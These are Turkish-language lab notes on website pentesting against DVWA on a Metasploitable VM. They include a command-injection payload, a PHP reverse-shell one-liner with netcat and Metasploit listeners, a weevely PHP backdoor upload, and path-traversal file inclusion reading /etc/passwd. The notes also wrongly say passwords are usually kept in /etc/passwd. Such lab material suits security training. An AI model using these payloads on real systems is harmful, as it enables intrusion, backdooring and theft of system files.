	WEBSITE PENTESTING
  Hackerlar olarak websitelerinde görmüş olduğumuz tüm formları kurcalayıp açık aramamız gerekiyor.

  Kod Uygulama Açığı
 Metasploitable Sanal Makinemizi açtıktan sonra Kali içerisinde:
 Firefox -> 10.0.2.4/	-> Metasploitable'ımızın ip adresi
 DVWA/
 DVWA Security -> low -> submit
 Command Execution
 Herhangi bir ip adresi girdiğimizde onu pingleyecektir.
 IP Adresini yazdıktan sonra komut ekleyip çalışıyor mu, açık var mı diye kontrol edebiliriz.
 10.0.2.10; pwd	-> Yazdığımızda site bize hangi dosyanın içerisinde olduğunu gösterdi, yani açık var.
 Bu sebeple burada bir kod çalıştırmamız gerekiyor.
 



  Ters TCP Komutları
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set lhost 10.0.2.10
set lport 5050
exploit	-> Bize gelecek olan bağlantıları dinlemeye başladık.

 Firefox > Reverse shell commands < pentestmonkey.net
 Burada gözüken kodları açığını bulduğumuz sitede deneyeceğiz. (Hangi dil olduğu önemli denenerek de bulunabilir.)
 Açığını bulduğumuz yere php kodunu yapıştırıyoruz.

 10.0.2.10; php -r '$sock=fsockopen("10.0.2.10",5050);exec("/bin/sh -i <&3 >&3 2>&3");'

 fsosckopen("10.0.2.10",5050) <- Bize bağlanması için yazanların yerine kendi ip adresimizi(10.0.2.10) ve portumuzu(5050) girdik.
 Session'ımız uyandı. Ama tekrar kapandı -> Metepreter session'ımızda sorun olabilir.

 Meterpreter yerine Netcat Kullanalım.
 nc -vv -l -p 5050	-> Dinlemeye başladı.
 Sitemizde tekrardan php kodunu çalıştıralım.
 10.0.2.10; php -r '$sock=fsockopen("10.0.2.10",5050);exec("/bin/sh -i <&3 >&3 2>&3");'
 Netcat işe yaradı. ls çalıştırarak Websitesini Hacklemeyi başardığımızı görmüş olacağız.

 Metasploitable'da da aynı dosya içerisine girdiğimizde aynı işlemleri kontrol ettiğimizi görmüş olacağız.




  Dosya Yükleme Açıkları
 DVWA -> Upload
 Yüklediğimiz image'ı nereye kaydettiğini söylüyor. 
 Başında ../../ olduğu için şuan bulunduğumuz adresten 2 yeri silip,
 yerine dosyamızı nereye yüklediğini yapıştıracağız.

 http://10.0.2.4/dvwa/vulnerabilities/upload/# -> Yerine,
 http://10.0.2.4/dvwa/hackable/uploads/EANotes -> Bu adrese gideceğiz.

 Eğer buraya bir image yükleyebiliyorsak php dosyası da yükleyebiliriz.
 Bunun için weevely adlı tool'u kullanacağız.
 weevely generate 123456 /root/myconnection.php
	Şifre/Dosyamızı Kaydettiği Yer/Dosyamızın ismi
 Komutu çalıştırdığımızda weevely bizim için bir backdoor yaratacaktır.
 Bu oluşturmuş trojanı siteye upload edeceğiz.
 
 http://10.0.2.4/dvwa/hackable/uploads/myconnection.php	-> Hackleyeceğimiz  site Trojanımızı buraya yükledi.
 weevely üzerindenn yüklemiş olduğu yerin sonuna şifremizi yazıp çalıştırırsak:
 weevely http://10.0.2.4/dvwa/hackable/uploads/myconnection.php 123456
 Session'ımız açılmış olacaktır.
 Sitemizi tekrardan Hackledik!




  Dosya Barındırma Açıkları
 DVWA -> File Inclusion
 Eğer böyle bir açık var ise,
 URL kısmına aradığımız dosya isimlerini yazarak hiçbir erişimimiz olmamasına rağmen o web serverdaki kayıtlı dosyaları görebiliriz.
 http://10.0.2.4/dvwa/vulnerabilities/fi/?page=include.php	-> ?page= kısmını siliyoruz.
 http://10.0.2.4/dvwa/vulnerabilities/fi/include.php		-> Adresine gittiğimizde nerede hata olduğunu gösterecektir.

 Bize vermiş olduğu adresi hacklemiş olduğumuz sitenin page= yazan kısma yapıştırıyoruz.
 http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/vulnerabilities/fi/include.php
 Yazdığımızda hiçbir şey değişmedi, sondaki dosya isimlerini silerek istediğimiz dosyayı upload ettirebiliriz.

 http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/vulnerabilities/fi/
 fi klasörünü yüklemeye çalıştık ve bazı geridönüşler elde ettik.
 Bunun gibi başka dosyaları da açmaya çalıştırarak klasörler içerisinde bir hata alıyor muyuz veya içerisinde bir dosya var mı görmeye çalışabiliriz.
 
 Genellikle şifreler /etc/passwd/ içerisine saklanır. Bunu hacklemiş olduğumuz sitede aratırsak da erişebiliriz.
 http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/etc/passwd/	-> Diye aratırsak bize passwd klasörünün içeriklerini gösterecektir.
 File Inclusion açığı sayesinde tüm klasörlere erişim sağlayabiliriz.

 NOTE:
 Eğer dosya silme işlemi çalışmazsa sileceğimiz dosyaların herbirinin yerine .. koyabiliriz.
 http://10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd/